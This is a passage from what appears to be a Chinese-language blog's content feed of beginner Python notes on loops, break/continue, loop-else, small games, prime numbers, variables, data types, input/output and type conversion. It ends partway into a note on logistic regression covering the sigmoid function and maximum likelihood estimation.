<span class="number">1</span></span><br><span class="line">a = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输输入行数：&quot;</span>))</span><br><span class="line">b = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入列数：&quot;</span>))</span><br><span class="line"><span class="keyword">while</span> i &lt;= a:</span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> j &lt;= b:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;*&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)   <span class="comment"># 默认情况下，print() 会在结尾添加换行符 \n，但 end=&#x27;&#x27; 覆盖了这一行为</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()<span class="comment"># 换行</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="4-循环嵌套-打印倒三角"><a href="#4-循环嵌套-打印倒三角" class="headerlink" title="4.循环嵌套-打印倒三角"></a>4.循环嵌套-打印倒三角</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line">a = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;行数：&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt;= a:</span><br><span class="line">    j = a - i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> j &gt;= <span class="number">1</span>:          <span class="comment">#第二层循环的计数器要在第一层下面声明</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;*&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        j -= <span class="number">1</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><h4 id="5-循环嵌套-99乘法表"><a href="#5-循环嵌套-99乘法表" class="headerlink" title="5.循环嵌套-99乘法表"></a>5.循环嵌套-99乘法表</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打印倒三角形</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">9</span>:</span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> j &lt;= i:</span><br><span class="line">        count = i * j</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%d * %d = %d  &quot;</span> %(i, j ,count) ,end=<span class="string">&#x27;&#x27;</span>)  <span class="comment"># &quot;&quot; 后不加&#x27;,&#x27;</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><h4 id="1-for循环介绍"><a href="#1-for循环介绍" class="headerlink" title="1.for循环介绍"></a>1.for循环介绍</h4><ul><li><p>格式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> 临时变量 <span class="keyword">in</span> 列表或字符串:</span><br><span class="line">    满足条件执行代码</span><br></pre></td></tr></table></figure></li><li><p>往往用于遍历</p></li><li><p>for循环的临时变量, 只能在<strong>for循环内部使用</strong>, 除了for循环就不能用了.<br>这个是变量的: 作用域, 即: 变量<strong>在哪里能用</strong>, 在哪里<strong>不能用</strong>.</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 需求1: for循环 遍历字符串.</span></span><br><span class="line">s = <span class="string">&#x27;heima&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="comment"># i 就是 字符串s中的每个字符, 例如: &#x27;h&#x27;, &#x27;e&#x27;, &#x27;i&#x27;, &#x27;m&#x27;, &#x27;a&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">28</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 需求2: for循环, 打印 1 ~ 5之间的数字.</span></span><br><span class="line"><span class="comment"># 扩展: range(起始值, 结束值, 步长)  生成指定范围内的数字(包左不包右, 前闭后开), 默认的起始值: 0, 默认的步长是: 1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 需求3: for循环, 统计 1 ~ 100之间的 奇数和.</span></span><br><span class="line"><span class="comment"># 1. 循环外定义求和变量 sum</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>, <span class="number">2</span>):</span><br><span class="line">    <span class="built_in">sum</span> += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;求和结果为: <span class="subst">&#123;<span class="built_in">sum</span>&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-for循环-99乘法表"><a href="#2-for循环-99乘法表" class="headerlink" title="2.for循环-99乘法表"></a>2.for循环-99乘法表</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i+<span class="number">1</span>):</span><br><span class="line">        count = i * j</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%d * %d = %d  &quot;</span> %(j, i, count), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>() <span class="comment">#换行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="控制跳转语句-break-continue"><a href="#控制跳转语句-break-continue" class="headerlink" title="控制跳转语句-break-continue"></a>控制跳转语句-break-continue</h2><ul><li>break：终止循环, 即: 循环不再继续执行了.</li><li>continue：结束本次循环, 进行下次循环的.</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 需求: 观察如下的代码, 再其中填充指定内容, 使其能够完成 打印2次, 7次, 13次 &#x27;Hello World&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):      <span class="comment"># i的值: 1, 2, 3, 4, 5, 6, 7, 8, 9, 10</span></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 这里加内容</span></span><br><span class="line">        <span class="comment"># break         # 看到break, 循环结束, 即: 打印的有 1, 2</span></span><br><span class="line">        <span class="comment"># continue      # 看到continue, 就结束本次循环, 立即开启下次循环, 即: 不打印的值有: 3, 6, 9</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;hello world! <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;hello world! <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;至此, for循环就执行结束了!&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">42</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;hello world! <span class="subst">&#123;i&#125;</span>&#x27;</span>)  <span class="comment"># 输出：hello world! 42</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;Alice&quot;</span></span><br><span class="line">age = <span class="number">25</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span> is <span class="subst">&#123;age&#125;</span> years old.&#x27;</span>)  <span class="comment"># 输出：Alice is 25 years old.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># f 前缀表示这是一个 f-string。</span></span><br><span class="line"><span class="comment"># &#123;i&#125; 会被替换为变量 i 的实际值。</span></span><br></pre></td></tr></table></figure><h4 id="1-报数字游戏"><a href="#1-报数字游戏" class="headerlink" title="1.报数字游戏"></a>1.报数字游戏</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">案例: 报数字游戏.</span></span><br><span class="line"><span class="string">规则:</span></span><br><span class="line"><span class="string">    1. 键盘录入玩游戏的人数.</span></span><br><span class="line"><span class="string">    2. 每个学生依次报数, 遇到尾数为7 或者 7的倍数时, 就跳过.</span></span><br><span class="line"><span class="string">    3. 统计报数的学生一共有多少人.</span></span><br><span class="line"><span class="string">大白话翻译:</span></span><br><span class="line"><span class="string">    统计指定区间内, 尾数不为7 或者 不是7倍数的数字 共有多少个.</span></span><br><span class="line"><span class="string">参考答案:</span></span><br><span class="line"><span class="string">    50个学生, 报数的同学为: 39人.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;参加人数：&#x27;</span>))</span><br><span class="line">a = <span class="number">0</span>                       <span class="comment">#计数器从0开始，遇到一个加一</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, num + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">7</span> == <span class="number">0</span> <span class="keyword">or</span> i % <span class="number">10</span> == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    a += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;实际参加人数<span class="subst">&#123;num&#125;</span>, 报数人数<span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-猜数字游戏"><a href="#2-猜数字游戏" class="headerlink" title="2.猜数字游戏"></a>2.猜数字游戏</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">需求:</span></span><br><span class="line"><span class="string">    1. 随机生成1个 1 ~ 100之间的随机数, 让用户来猜.</span></span><br><span class="line"><span class="string">    2. 如果用户猜大了, 就提示: 您猜大了.  接着让用户来猜.</span></span><br><span class="line"><span class="string">    3. 如果用户猜小了, 就提示: 您猜小了.  接着让用户来猜.</span></span><br><span class="line"><span class="string">    4. 如果用户猜对了, 就提示: 恭喜您, 猜对了. 并结束程序.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">num = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入数字：&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> a &gt; num:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;太大了&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">elif</span> a &lt; num:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;太小了&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正确&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="3-扩展-循环-else语法"><a href="#3-扩展-循环-else语法" class="headerlink" title="3.扩展-循环+else语法"></a>3.扩展-循环+else语法</h4><ul><li><p><strong>概述</strong>：else语句除了可以和 if语句结合使用外, 还可以和 循环一起使用.</p></li><li><p><strong>格式</strong>：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> 或者 <span class="keyword">for</span>循环:</span><br><span class="line">    循环体</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    语句体</span><br></pre></td></tr></table></figure></li><li><p><strong>特点</strong>：</p><ul><li>只要循环是正常退出的, 就一定会执行 else中的内容.</li><li>循环正常退出 指的是 非break的方式跳出.</li><li>大白话: 只要循环不是break方式跳出的, 就会走else的内容, 否则不执行else的内容.</li></ul></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 需求1: 演示 for + else语句.</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):      <span class="comment"># i的值: 1, 2, 3, 4, 5, 6, 7, 8, 9, 10</span></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># continue            # 结束本次循环, 进行下次循环的.执行else</span></span><br><span class="line">        <span class="comment"># break  # 全部退出，不执行else</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;hello world! <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;我是else, 看看我执行了吗?&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="4-扩展-打印质数"><a href="#4-扩展-打印质数" class="headerlink" title="4.扩展-打印质数"></a>4.扩展-打印质数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">需求:</span></span><br><span class="line"><span class="string">    打印 1 ~ 100之间所有的质数, 按照 3个一行的方式进行输出.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">质数解释:</span></span><br><span class="line"><span class="string">    1. 只能被1 和 自身整除的数字, 就称之为 质数, 质数 也叫 素数.</span></span><br><span class="line"><span class="string">    2. 最小的质数是 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">分析思路, 例如: 判断 10 是否是质数</span></span><br><span class="line"><span class="string">    1. 获取到 2 ~ 5(10的一半) 的值.</span></span><br><span class="line"><span class="string">    2. 和 10进行取余操作, 但凡有一组能整除, 说明10不是质数.</span></span><br><span class="line"><span class="string">    3. 无需判断后续的操作了, 直接判断 下个数字.</span></span><br><span class="line"><span class="string">        例如: 10 % 2 = 0, 说明10不是质数, 没必要接着判断 10 % 3  而是直接判断 11(下个数字)是否是质数即可.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 场景1: 分解版写法.</span></span><br><span class="line"><span class="comment"># 1. 定义计数器 count, 表示 质数的个数.</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="comment"># 2. 获取到 1 ~ 100之间 所有的整数.</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">101</span>):             <span class="comment"># i 表示 要判断是否为 质数的数字, 例如:  10             13</span></span><br><span class="line">    <span class="comment"># 3. 获取到 2 ~ i的一半之间, 所有的整数, 一会儿和i进行取余操作.</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, i // <span class="number">2</span> + <span class="number">1</span>):  <span class="comment"># j 表示 要进行取余操作的数字,   例如:   2,3,4,5        2,3,4,5,6</span></span><br><span class="line">        <span class="comment"># 4. 具体的判断动作, 看其是否是质数.</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:              <span class="comment"># 10 % 2,  10 % 3,  10 % 4,  10 % 5               13 % 2, 13 % 3...</span></span><br><span class="line">            <span class="comment"># 5. 走到这里, 说明 i 不是质数, 没必要继续判断i了, 直接判断 i + 1即可.</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 6. 走到这里, 说明 不是break方式结束的, 说明 i 是质数.</span></span><br><span class="line">        count += <span class="number">1</span>      <span class="comment"># 计数器 + 1</span></span><br><span class="line">        <span class="keyword">if</span> count % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(i, end=<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(i, end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">28</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 场景2: 合并版写法.</span></span><br><span class="line"><span class="comment"># 1. 定义计数器 count, 表示 质数的个数.</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="comment"># 2. 获取到 1 ~ 100之间 所有的整数.</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">101</span>):             <span class="comment"># i 表示 要判断是否为 质数的数字, 例如:  10             13</span></span><br><span class="line">    <span class="comment"># 3. 获取到 2 ~ i的一半之间, 所有的整数, 一会儿和i进行取余操作.</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, i // <span class="number">2</span> + <span class="number">1</span>):  <span class="comment"># j 表示 要进行取余操作的数字,   例如:   2,3,4,5        2,3,4,5,6</span></span><br><span class="line">        <span class="comment"># 4. 具体的判断动作, 看其是否是质数.</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:              <span class="comment"># 10 % 2,  10 % 3,  10 % 4,  10 % 5               13 % 2, 13 % 3...</span></span><br><span class="line">            <span class="comment"># 5. 走到这里, 说明 i 不是质数, 没必要继续判断i了, 直接判断 i + 1即可.</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 6. 走到这里, 说明 不是break方式结束的, 说明 i 是质数.</span></span><br><span class="line">        count += <span class="number">1</span>      <span class="comment"># 计数器 + 1</span></span><br><span class="line">        <span class="built_in">print</span>(i, end=<span class="string">&#x27;\n&#x27;</span> <span class="keyword">if</span> count % <span class="number">3</span> == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">28</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 场景3: 算法(公式)实现.</span></span><br><span class="line"><span class="comment"># 规律: 2 ~ 100之间的质数, 只要是 2, 3, 5, 7 或者 不能被其中所有的整数 整除, 该数字就是: 数值.</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">101</span>):</span><br><span class="line">    <span class="comment"># 条件1: 是2, 3, 5, 7      或者  条件2: 不能被2,3,5,7 任意1个数字整除.</span></span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> (<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>) <span class="keyword">or</span> (i % <span class="number">2</span> != <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">3</span> != <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">5</span> != <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">7</span> != <span class="number">0</span>):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(i, end = <span class="string">&#x27;\n&#x27;</span> <span class="keyword">if</span> count % <span class="number">3</span> == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>初识python</title>
      <link href="/2025/06/23/%E5%8F%98%E9%87%8F%E4%BB%8B%E7%BB%8D/"/>
      <url>/2025/06/23/%E5%8F%98%E9%87%8F%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<h2 id="变量介绍"><a href="#变量介绍" class="headerlink" title="变量介绍:"></a>变量介绍:</h2><ul><li><p>定义：<strong>程序</strong>就是用来<strong>处理数据</strong>的，而<strong>变量</strong>就是用来<strong>存储数据</strong>的</p></li><li><p>概述：</p><p>① 变量是存储数据的容器</p><p>② 变量在程序运行过程中是可以发生改变的量</p><p>③ 变量存储的数据是临时的</p></li></ul><p>​        变量名 &#x3D; 变量值</p><ul><li>细节:<ul><li>&#x3D;号两端 建议加上 空格, 阅读性更好。</li><li>命名要符合 标识符的 规则和规范。</li><li>如果要打印某个变量的值, 直接写变量名即可, 千万不能加引号, 否则就变成: 打印字符串了。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)   <span class="comment">#输出100 </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a&quot;</span>) <span class="comment">#输出a</span></span><br></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ul><li><p>int float bool string</p></li><li><p>查看变量</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="number">100</span></span><br><span class="line">my_type = <span class="built_in">type</span>(num)</span><br><span class="line"><span class="built_in">print</span>(my_type)</span><br></pre></td></tr></table></figure></li></ul><h2 id="标识符和关键字"><a href="#标识符和关键字" class="headerlink" title="标识符和关键字"></a>标识符和关键字</h2><h3 id="标识符命名规则"><a href="#标识符命名规则" class="headerlink" title="标识符命名规则"></a>标识符命名规则</h3><ol><li>见明知意</li><li>由字母、数字、下划线组成</li><li>区分大小写</li><li>不能和关键字重复</li></ol><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><ul><li><p>python的关键字</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入包</span></span><br><span class="line"><span class="keyword">import</span> keyword</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="built_in">print</span>(keyword.kwlist)</span><br></pre></td></tr></table></figure></li></ul><h3 id="命名方法"><a href="#命名方法" class="headerlink" title="命名方法"></a>命名方法</h3><ul><li>小驼峰：第一个单词以小写字母开始，第二个单词的首字母大写 例如：myName</li><li>大驼峰：每一个单字的首字母都采用大写字母 例如：FirstName</li><li>下划线：用下划线“_”来连接所有的单词 例如：send_buf</li></ul><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><ul><li><p>print输出</p><p><img src="/./%E5%8F%98%E9%87%8F%E4%BB%8B%E7%BB%8D/image-20250527170646076.png" alt="image-20250527170646076"></p></li><li><p>格式化输出：更灵活</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="number">18</span></span><br><span class="line">name = <span class="string">&quot;皆安&quot;</span></span><br><span class="line">mobile = <span class="number">13945936812</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我的名字是%s,\n 年龄是%d岁,\n 联系方式%s&quot;</span> %(name, age, mobile))</span><br></pre></td></tr></table></figure><table><thead><tr><th>格式符号</th><th>转化</th></tr></thead><tbody><tr><td>%s</td><td>字符串</td></tr><tr><td>%d</td><td>整型</td></tr><tr><td>%f</td><td>浮点型</td></tr></tbody></table></li></ul><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><ul><li><p>input()的小括号中放入的是，提示信息，用来在获取数据之前给用户的一个简单提示</p></li><li><p>input()在从键盘获取了数据以后，会存放到等号右边的变量中</p></li><li><p>input()会把用户输入的任何值都作为<strong>字符串</strong>来对待</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">password = <span class="built_in">input</span>(<span class="string">&quot;请输入密码：&quot;</span>)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;你的密码是：%s&quot;</span> %password)</span><br></pre></td></tr></table></figure></li></ul><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h4><ul><li><ul><li></li></ul></li><li><ul><li></li></ul></li><li><ul><li></li></ul></li><li>&#x2F;</li><li>&#x2F;&#x2F;：取整除返回商的整数部分 9&#x2F;&#x2F;2 输出结果 4 , 9.0&#x2F;&#x2F;2.0 输出结果 4.0</li><li>%</li></ul><hr><h4 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h4><ul><li>&#x3D;</li></ul><h4 id="复合赋值运算符"><a href="#复合赋值运算符" class="headerlink" title="复合赋值运算符"></a>复合赋值运算符</h4><ul><li>算数在前，赋值在后</li></ul><h3 id="数据类型的转化"><a href="#数据类型的转化" class="headerlink" title="数据类型的转化"></a>数据类型的转化</h3><p>取整除返回商的整数部分 9&#x2F;&#x2F;2 输出结果 4 , 9.0&#x2F;&#x2F;2.0 输出结果 4.0</p><table><thead><tr><th align="center">函数</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">int(x [,base ])</td><td align="center">将x转换为一个整数</td></tr><tr><td align="center">float(x )</td><td align="center">将x转换为一个浮点数</td></tr><tr><td align="center">str(x )</td><td align="center">将对象 x 转换为字符串</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入年龄：&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;你的年龄是：%d&quot;</span> %age)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>逻辑回归</title>
      <link href="/2025/05/09/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/"/>
      <url>/2025/05/09/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/</url>
      
        <content type="html"><![CDATA[<h1 id="逻辑回归"><a href="#逻辑回归" class="headerlink" title="逻辑回归"></a>逻辑回归</h1><h2 id="逻辑回归简介"><a href="#逻辑回归简介" class="headerlink" title="逻辑回归简介"></a>逻辑回归简介</h2><p><img src="/2025/05/09/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/image-20230904115156371.png" alt="image-20230904115156371"></p><p>逻辑回归是解决二分类问题的利器</p><h3 id="数学知识"><a href="#数学知识" class="headerlink" title="数学知识"></a>数学知识</h3><h4 id="sigmoid函数"><a href="#sigmoid函数" class="headerlink" title="sigmoid函数"></a>sigmoid函数</h4><p><img src="/2025/05/09/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/image-20230913152535607.png" alt="image-20230913152535607"></p><p><img src="/2025/05/09/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/image-20230904144434180.png" alt="image-20230904144434180"></p><p><img src="/2025/05/09/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/image-20230904144454316.png" alt="image-20230904144454316"></p><h4 id="概率"><a href="#概率" class="headerlink" title="概率"></a>概率</h4><p><img src="/2025/05/09/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/image-20230904144658969.png" alt="image-20230904144658969"></p><h4 id="极大似然估计"><a href="#极大似然估计" class="headerlink" title="极大似然估计"></a>极大似然估计</h4><p>核心思想：</p><p>设模型中含有待估参数w，可以取很多值。已经知道了样本观测值，从w的一切可能值中（选出一个使该观察值出现的概率为最大的值，作为w参数的估计值，这就是极大似然估计。（顾名思义：就是看上去那个是最大可能的意思）</p><p>举个例子：</p><p>假设有一枚不均匀的硬币，出现正面的概率和反面的概率是不同的。假定出现正面的概率为𝜃， 抛了6次得到如下现象 D &#x3D; {正面，反面，反面，正面，正面，正面}。每次投掷事件都是相互独立的。 则根据产生的现象D，来估计参数𝜃是多少?</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">P(D|𝜃) = P &#123;正面，反面，反面，正面，正面，正面&#125;</span><br><span class="line"> = P(正面|𝜃) P(正面|𝜃) P(正面|𝜃) P(正面|𝜃) P(正面|𝜃) P(正面|𝜃)</span><br><span class="line"></span><br><span class="line">=𝜃 *(1-𝜃)*(1-𝜃)𝜃*𝜃*𝜃 = 𝜃4(1 − 𝜃)</span><br></pre></td></tr></table></figure><p>问题转化为:求此函数的极大值时，估计𝜃为多少</p><p><img src="/2025/05/09/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/image-20230904145453737.png" alt="image-20230904145453737"></p><h4 id="对数函数"><a href="#对数函数" class="headerlink" title="对数函数"></a>对数函数</h4><p><img src="/2025/05/09/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/image-20230904145530932.png" alt="image-20230904145530932"></p><h2 id="逻辑回归原理"><a href="#逻辑回归原理" class="headerlink" 